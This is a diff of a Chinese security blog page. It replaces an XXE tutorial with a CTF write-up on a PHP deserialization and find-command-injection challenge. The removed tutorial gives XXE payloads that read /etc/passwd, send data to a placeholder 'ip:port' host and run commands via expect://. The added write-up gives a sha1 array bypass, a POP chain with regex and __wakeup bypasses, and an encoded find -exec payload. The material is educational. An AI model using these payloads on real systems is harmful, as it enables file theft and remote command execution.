@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="生如逆旅，一苇以航。">
 <meta name="theme-color" content="#000">
-<title>XXE | outlaws&#39; blog</title>
+<title>记一道反序列化&amp;find命令执行题目 | outlaws&#39; blog</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1616470373249">
 <link rel="stylesheet" href="/media/css/pisces.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -52,8 +52,8 @@
 
 
 
-  <meta name="description" content="XXE" />
-  <meta name="keywords" content="xxe,knowledge-web" />
+  <meta name="description" content="记一道反序列化&find命令执行题目" />
+  <meta name="keywords" content="" />
 </head>
 
 <body>
@@ -268,31 +268,9 @@
   <div class="toc-wrapper auto-number auto"
     id="toc_wrapper">
     <ul class="markdownIt-TOC">
-<li><a href="#xml%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">XML基础知识</a></li>
-<li><a href="#dtd%E6%96%87%E6%A1%A3%E7%B1%BB%E5%9E%8B%E5%AE%9A%E4%B9%89">DTD(文档类型定义)</a>
-<ul>
-<li><a href="#%E5%86%85%E9%83%A8%E7%9A%84doctype">内部的DOCTYPE</a></li>
-<li><a href="#%E5%A4%96%E9%83%A8%E7%9A%84%E6%96%87%E6%A1%A3%E5%A3%B0%E6%98%8E">外部的文档声明</a></li>
-</ul>
-</li>
-<li><a href="#dtd%E5%AE%9E%E4%BD%93">DTD实体</a>
-<ul>
-<li><a href="#%E5%86%85%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E">内部实体声明</a></li>
-<li><a href="#%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E">外部实体声明</a></li>
-<li><a href="#%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E">参数实体声明</a></li>
-</ul>
-</li>
-<li><a href="#xxe%E5%88%86%E7%B1%BB">XXE分类</a></li>
-<li><a href="#%E6%80%8E%E6%A0%B7%E5%88%A9%E7%94%A8">怎样利用</a>
-<ul>
-<li><a href="#1%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87dtd%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E">1.直接通过DTD外部实体声明</a></li>
-<li><a href="#2%E9%80%9A%E8%BF%87dtd%E6%96%87%E6%A1%A3%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8dtd%E6%96%87%E6%A1%A3%E7%9A%84%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E">2.通过dtd文档引入外部dtd文档的外部实体声明</a></li>
-<li><a href="#3%E9%80%9A%E8%BF%87dtd%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8dtd%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E">3.通过dtd外部实体声明引入外部dtd文档中的外部实体声明</a></li>
-<li><a href="#4blind-xxe">4.Blind XXE</a></li>
-</ul>
-</li>
-<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F">利用方式</a></li>
-<li><a href="#%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE">支持的协议</a></li>
+<li><a href="#part1-md5%E7%BB%95%E8%BF%87">part1 md5绕过</a></li>
+<li><a href="#part2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">part2 反序列化</a></li>
+<li><a href="#%E5%B0%8F%E7%BB%93">小结</a></li>
 </ul>
 
   </div>
@@ -558,8 +536,8 @@
           <div class="section bg-color post post-page">
             <section class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://outlaws-bai.github.io/post/xxe/">
-      XXE
+    <a class="post-title-link" href="https://outlaws-bai.github.io/post/ji-yi-dao-fan-xu-lie-hua-andfind-ming-ling-zhi-xing-ti-mu/">
+      记一道反序列化&amp;find命令执行题目
     </a>
   </h1>
   <div class="post-meta">
@@ -567,241 +545,136 @@
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span class="language" data-lan="publish">发布于</span>
-      <span class="publish-time" data-t="2021-03-19 09:14:20">2021-03-19</span>
+      <span class="publish-time" data-t="2021-03-23 11:30:53">2021-03-23</span>
       <span class="post-meta-divider pc-show">|</span>
     </span>
     
     <span class="meta-item">
-      <i class="fa fa-folder-o"></i>
-      <span class="pc-show language" data-lan="category-in">分类于</span>
-      
-      
-      <a href="https://outlaws-bai.github.io/tag/huD-RSkGc/">
-        <span>xxe</span>
-      </a>、
-      
-      
-      
-      <a href="https://outlaws-bai.github.io/tag/g6GKCnb6O/">
-        <span>knowledge-web</span>
-      </a>
-      
-      
-    </span>
-    <span class="post-meta-divider">|</span>
-    
-    <span class="meta-item">
       <i class="fa fa-clock-o"></i>
-      <span>6<span class="language" data-lan="minute">分钟</span></span>
+      <span>4<span class="language" data-lan="minute">分钟</span></span>
     </span>
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>1293<span class="pc-show language" data-lan="words">字数</span></span>
+      <span>812<span class="pc-show language" data-lan="words">字数</span></span>
     </span>
     
   </div>
 </section>
             <div class="post-body next-md-body" id="post_body">
-              <p>xxe全程XML External Entity Injection，也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。</p>
-<p>如今的 web 时代，是一个前后端分离的时代，有人说 MVC 就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api 只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json 格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api 接口，这里的前端可以是传统意义的前端，也可以是后台代码）</p>
-<p>那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，</p>
-<h1 id="xml基础知识">XML基础知识</h1>
-<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
-<p><strong>示例代码：</strong></p>
-<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
-&lt;!DOCTYPE foo [
-&lt;!ELEMENT foo ANY &gt;
-&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;
+              <p>打开题目</p>
+<figure data-type="image" tabindex="1"><img src="https://outlaws-bai.github.io/post-images/1616470323708.png" alt="" loading="lazy"></figure>
+<h1 id="part1-md5绕过">part1 md5绕过</h1>
+<p>右键查看源码提示有index.php.bak，下载后打开</p>
+<pre><code class="language-php">&lt;?php
+    error_reporting(0);
+    $rand_str = '********';
+    $cookie_data = json_decode($_COOKIE['data'], true);
+    if ($cookie_data['data'] == strtolower(md5($rand_str))) {
+        $a = $_POST['a'];
+        $b = $_POST['b'];
+        if ($a != $b &amp;&amp; sha1($a) === sha1($b)) {
+            include('******.php');
+        }else{
+            '!!';
+        }
+    }else{
+        echo '!';
+    } 
+?&gt;
 </code></pre>
-<p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p>
-<p><strong>示例代码：</strong></p>
-<pre><code>&lt;creds&gt;
-&lt;user&gt;&amp;xxe;&lt;/user&gt;
-&lt;pass&gt;mypass&lt;/pass&gt;
-&lt;/creds&gt;
+<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>o</mi><mi>k</mi><mi>i</mi><msub><mi>e</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><mi>d</mi><mi>a</mi><mi>t</mi><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo>(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">cookie_data[&#x27;data&#x27;] == strtolower(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>rand_str))</p>
+<p>设置Cookie:data={&quot;data&quot;:1}，爆破1-1000得到data为25时，可使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>o</mi><mi>k</mi><mi>i</mi><msub><mi>e</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><msup><mo>[</mo><mo mathvariant="normal">′</mo></msup><mi>d</mi><mi>a</mi><mi>t</mi><msup><mi>a</mi><mo mathvariant="normal">′</mo></msup><mo>]</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>t</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>w</mi><mi>e</mi><mi>r</mi><mo>(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">cookie_data[&#x27;data&#x27;] == strtolower(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>rand_str))【为true也可以】</p>
+<p>$a != <span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;EOF&#039;, got &#039;&amp;&#039; at position 3: b &amp;̲&amp; sha1('>b &amp;&amp; sha1(</span>a) === sha1($b)</p>
+<p>a[]=1&amp;b[]=2绕过即可</p>
+<h1 id="part2-反序列化">part2 反序列化</h1>
+<pre><code class="language-php">&lt;?php   
+class getresult{
+    public $obj;
+    public $file;
+
+    function __destruct()
+    {
+        if ($this-&gt;file != '')
+        {
+            $this-&gt;obj-&gt;execute();
+        }
+        else
+        {
+            die('fail to getshell!!!');
+        }
+    }
+
+    function __wakeup()
+    {
+        foreach(get_object_vars($this) as $key =&gt; $value)
+        {
+            $this-&gt;$key = null;
+        }
+        echo &quot;wakeup&quot;;
+    }
+}
+
+class find{
+    private $file;
+    function execute(){
+        system(&quot;find /tmp -iname &quot;.escapeshellcmd($this-&gt;file)); 
+        die('Success!!!');
+    }
+}
+if(isset($_GET['pop'])){
+    $pop = $_GET['pop'];
+    preg_match('/[oc]:\d+:/i', $pop, $result);
+    if(count($result)){
+        die('no!');
+    }
+    unserialize($pop);
+}
+
+show_source(__FILE__); 
 </code></pre>
-<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 &quot;test&quot; 替换。</p>
-<h1 id="dtd文档类型定义">DTD(文档类型定义)</h1>
-<p>DTD作用就是区定义xml文档的合法构建 模块，也就是说声明了xml的内容格式规范。</p>
-<p>1内部DTD：即对XML文档的元素、属性和实体的DTD的声明都在xml文档中。</p>
-<p>2外部DTD：即对XML文档中的元素、属性和实体的DTD的声明都在一个独立的DTD文件(.dtd)中。</p>
-<h2 id="内部的doctype">内部的DOCTYPE</h2>
-<pre><code>
-&lt;!DOCTYPE 根元素 [元素声明]&gt;
-
+<p>1.绕过preg_match('/[oc]:\d+:/i', $pop, $result);处正则，只需使得O:+9即可，但要注意+需使用url编码后的%2B，否则会被解析为空格</p>
+<p>2.绕过__wakeup()  O:9:&quot;getresult&quot;:2:{   将2改为3</p>
+<p>3.escapeshellcmd()</p>
+<pre><code class="language-text">escapeshellcmd()函数对字符串中可能会欺骗shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec()或 system() 函数，或者执行操作符之前进行转义。
+反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$\,\x0A 和 \xFF。 ' 和 &quot; 仅在不配对儿的时候被转义。 在 Windows平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
+而find命令，如果想多执行别的命令，可以利用-or，并且-exec 参数后面跟的是command命令，该命令的终止是以;为结束标志的，并且要注意前面的空格，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。
+所以可以构造payload为：find /tmp -iname sth -or -exec ls \;
+所以我们的输入为：sth -or -exec ls / ;，这里没有\，是因为上一个函数自动帮你加了\。
+读取flag文件，获取flag。
 </code></pre>
-<h2 id="外部的文档声明">外部的文档声明</h2>
-<pre><code>
-&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
+<p>构造pop：</p>
+<pre><code class="language-php">&lt;?php   
+class getresult{
+    public $obj;
+    public $file;
+    function __construct() {
+        $this-&gt;obj = new find();
+        $this-&gt;file = 'sth -or -exec cat /f111ag ;';
+    }
+}
 
+class find{
+    private $file='sth -or -exec cat /f111ag ;';
+}
+
+// $f=new find();
+// echo serialize($f)
+$g=new getresult();
+echo urlencode(serialize($g));
+echo serialize($g);
+
+#O%3A%2B9%3A%22getresult%22%3A3%3A%7Bs%3A3%3A%22obj%22%3BO%3A%2B4%3A%22find%22%3A1%3A%7Bs%3A10%3A%22%00find%00file%22%3Bs%3A27%3A%22sth+-or+-exec+cat+%2Ff111ag+%3B%22%3B%7Ds%3A4%3A%22file%22%3Bs%3A27%3A%22sth+-or+-exec+cat+%2Ff111ag+%3B%22%3B%7D
+
+?&gt;
 </code></pre>
-<h1 id="dtd实体">DTD实体</h1>
-<h2 id="内部实体声明">内部实体声明</h2>
-<pre><code>
-&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
-
-</code></pre>
-<h2 id="外部实体声明">外部实体声明</h2>
-<pre><code>
-&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;
-
-</code></pre>
-<h2 id="参数实体声明">参数实体声明</h2>
-<pre><code>
-&lt;!ENTITY %实体名称 &quot;实体的值&quot;&gt;
-
-</code></pre>
-<h1 id="xxe分类">XXE分类</h1>
-<p>按照构造外部实体声明的方法不同</p>
-<p>1.直接通过dtd外部实体声明</p>
-<p>2.通过dtd文档引入外部dtd文档中的外部实体声明</p>
-<p>3.通过dtd外部实体声明引入外部dtd文档中的外部实体声明</p>
-<p>***按照回显不同</p>
-<p>1.正常回显XXE</p>
-<p>2.报错XXE</p>
-<p>3.Blind XXE</p>
-<h1 id="怎样利用">怎样利用</h1>
-<h2 id="1直接通过dtd外部实体声明">1.直接通过DTD外部实体声明</h2>
-<pre><code>
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xxe[
-    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
-    ]&gt;
-&lt;a&gt;&amp;f;&lt;/a&gt;
-
-eg:
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
-&lt;!DOCTYPE xxe[
-    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;
-    ]&gt;
-&lt;user&gt;&lt;username&gt;&amp;f;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
-
-</code></pre>
-<h2 id="2通过dtd文档引入外部dtd文档的外部实体声明">2.通过dtd文档引入外部dtd文档的外部实体声明</h2>
-<pre><code>
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE xxe SYSTEM &quot;http://ip:port/evil.dtd&quot;&gt;
-&lt;a&gt;&amp;b;&lt;/a&gt;
-
-#其中的evil.dtd内容如下
-&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
-
-</code></pre>
-<h2 id="3通过dtd外部实体声明引入外部dtd文档中的外部实体声明">3.通过dtd外部实体声明引入外部dtd文档中的外部实体声明</h2>
-<pre><code>
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE xxe [
-    &lt;!ENTITY % file SYSTEM &quot;http://ip:port/evil.dtd&quot;&gt;
-        %file;
-    ]&gt;
-&lt;a&gt;&amp;b;&lt;/a&gt;
-
-#其中的evil.dtd内容如下
-&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
-
-</code></pre>
-<h2 id="4blind-xxe">4.Blind XXE</h2>
-<p>其实就是无法回显，将数据发送至vps</p>
-<pre><code>
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;!DOCTYPE root [
-    &lt;!ENTITY %remote SYSTEM &quot;http://ip:port/owen.dtd&quot;&gt;
-        %remote;
-    ]&gt;
-&lt;root&gt;file&lt;/root&gt;
-
-#其中owen.dtd内容如下
-&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
-&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:port/?file=%file;'&gt;&quot;&gt;
-%int;
-%send;
-
-</code></pre>
-<h1 id="利用方式">利用方式</h1>
-<p>1.读文件</p>
-<p>见怎样利用</p>
-<p>2.执行系统命令</p>
-<p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p>
-<pre><code>
-&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM &quot;expect://id&quot;&gt;]&gt;
-&lt;dir&gt;
-&lt;file&gt;&amp;cmd;&lt;/file&gt;
-&lt;/dir&gt;
-
-</code></pre>
-<p>3.http内网主机探测</p>
-<p>4.内网主机端口扫描</p>
-<p>5.内网盲注</p>
-<p>6.文件上传</p>
-<p>7.钓鱼</p>
-<h1 id="支持的协议">支持的协议</h1>
-<table>
-<thead>
-<tr>
-<th>libxml2</th>
-<th>php</th>
-<th>java</th>
-<th>.net</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>file</td>
-<td>file</td>
-<td>http</td>
-<td>file</td>
-</tr>
-<tr>
-<td>http</td>
-<td>http</td>
-<td>https</td>
-<td>http</td>
-</tr>
-<tr>
-<td>ftp</td>
-<td>ftp</td>
-<td>ftp</td>
-<td>https</td>
-</tr>
-<tr>
-<td></td>
-<td>php</td>
-<td>file</td>
-<td>ftp</td>
-</tr>
-<tr>
-<td></td>
-<td>compress.zlib</td>
-<td>jar</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>compress.zlib</td>
-<td>netdoc</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>data</td>
-<td>mailto</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>glob</td>
-<td>gopher*</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>phar</td>
-<td></td>
-<td></td>
-</tr>
-</tbody>
-</table>
+<p>即可getflag</p>
+<figure data-type="image" tabindex="2"><img src="https://outlaws-bai.github.io/post-images/1616470360978.png" alt="" loading="lazy"></figure>
+<h1 id="小结">小结</h1>
+<p>find命令，如果想多执行别的命令，可以利用-or，并且-exec 参数后面跟的是command命令，该命令的终止是以;为结束标志的，并且要注意前面的空格，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。<br>
+所以可以构造payload为：find /tmp -iname sth -or -exec ls ;<br>
+所以我们的输入为：sth -or -exec ls / ;，这里没有\，是因为上一个函数自动帮你加了\。<br>
+读取flag文件，获取flag。</p>
 
             </div>
             
@@ -814,7 +687,7 @@ eg:
     </li>
     <li class="post-copyright-link">
       <strong class="language" data-lan="link">本文链接：</strong>
-      <a href="https://outlaws-bai.github.io/post/xxe/" title="XXE">https://outlaws-bai.github.io/post/xxe/</a>
+      <a href="https://outlaws-bai.github.io/post/ji-yi-dao-fan-xu-lie-hua-andfind-ming-ling-zhi-xing-ti-mu/" title="记一道反序列化&amp;find命令执行题目">https://outlaws-bai.github.io/post/ji-yi-dao-fan-xu-lie-hua-andfind-ming-ling-zhi-xing-ti-mu/</a>
     </li>
     <li class="post-copyright-license">
       <strong class="language" data-lan="copyright">版权声明： </strong>
@@ -823,23 +696,15 @@ eg:
   </ul>
   <div class="tags">
     
-      <a href="https://outlaws-bai.github.io/tag/huD-RSkGc/"># xxe</a>
-    
-      <a href="https://outlaws-bai.github.io/tag/g6GKCnb6O/"># knowledge-web</a>
-    
   </div>
   <div class="nav">
     <div class="nav-prev">
       
-        <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" title="记一道session文件包含题目" href="https://outlaws-bai.github.io/post/LFI_session/">记一道session文件包含题目</a class="nav-pc-next">
-        <a class="nav-mobile-prev" title="记一道session文件包含题目" href="https://outlaws-bai.github.io/post/LFI_session/">上一篇</a>
-      
     </div>
     <div class="nav-next">
       
-        <a class="nav-pc-next" title="php序列化与反序列化" href="https://outlaws-bai.github.io/post/php-serialize&amp;unserialize/">php序列化与反序列化</a>
-        <a class="nav-mobile-next" title="php序列化与反序列化" href="https://outlaws-bai.github.io/post/php-serialize&amp;unserialize/">下一篇</a>
+        <a class="nav-pc-next" title="记一道session文件包含题目" href="https://outlaws-bai.github.io/post/LFI_session/">记一道session文件包含题目</a>
+        <a class="nav-mobile-next" title="记一道session文件包含题目" href="https://outlaws-bai.github.io/post/LFI_session/">下一篇</a>
         <i class="fa fa-chevron-right"></i>
       
     </div>
